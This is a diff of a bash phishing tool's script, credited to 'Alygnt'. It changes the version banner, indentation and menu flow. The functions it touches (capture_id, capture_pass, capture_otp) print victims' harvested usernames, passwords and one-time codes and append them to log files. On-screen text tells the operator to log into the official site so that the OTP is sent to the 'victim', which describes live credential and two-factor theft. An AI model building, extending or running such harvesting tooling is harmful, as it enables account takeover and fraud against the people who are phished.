@@ -56,7 +56,7 @@ cbanner(){
 	echo -e "${YELLOW} ╚════════╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
 	echo -e "${CYAN}                                                  By - ${RED}Alygnt${NC}"
 	echo -e "${CYAN}        ${NC} "
-	echo -e "${GREEN}                           Version 1.1 ${NC}"
+	echo -e "${GREEN}                           Version 1.0 ${NC}"
 	echo -e "${CYAN}        ${NC} "
 }
 #Small Banner
@@ -569,10 +569,7 @@ capture_data_check(){
 capture_id() {
 	echo "${RED}"
         cat .server/www/usernames.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}logs.dat"
-	cat .server/dumps/space.txt >> logs.dat
-        cat .server/www/usernames.txt >> logs.dat
-				echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> "logs/${log_name}.txt"
         cat .server/www/usernames.txt >> "logs/${log_name}.txt"
 	rm -rf .server/www/usernames.txt
@@ -582,7 +579,7 @@ capture_id() {
 capture_pass() {
 	echo "${RED}"
 	cat  .server/www/pass.txt
-				echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> logs/${log_name}.txt
         cat .server/www/pass.txt >> logs/${log_name}.txt
 	rm -rf .server/www/pass.txt
@@ -593,7 +590,7 @@ capture_pass() {
 capture_otp() {
 	echo "${RED}"
         cat  .server/www/otp.txt
-				echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> logs/${log_name}.txt
         cat .server/www/otp.txt >> logs/${log_name}.txt
 	rm -rf .server/www/otp.txt
@@ -635,7 +632,7 @@ capture_data_2() {
 			echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
                 fi
 		if [[ -e ".server/www/otp.txt" ]]; then
-			echo -ne "\n\n${GREEN} OTP Found !"
+			echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} OTP Found !"
                         capture_otp
                         rm -rf .server/www/otp.txt
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
@@ -662,7 +659,7 @@ capture_data_3() {
 			rm -rf .server/www/pass.txt
                 fi
 		if [[ -e ".server/www/otp.txt" ]]; then
-			echo -ne "\n\n${GREEN} OTP Found !"
+			echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} OTP Found !"
 			capture_otp
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 		fi
@@ -670,13 +667,13 @@ capture_data_3() {
 	done
 }
 
-+#Logs check
+#Logs check
 logs_check() {
 	if [ -z "$(ls -A $DIR)" ]; then
 		logs_menu
 	else
 		echo "No logs found"
-		{ sleep 1; clear; mainmenu; }
+		{ sleep 1; clear; tunnel_menu; }
 	fi
 }
 logs_menu() {
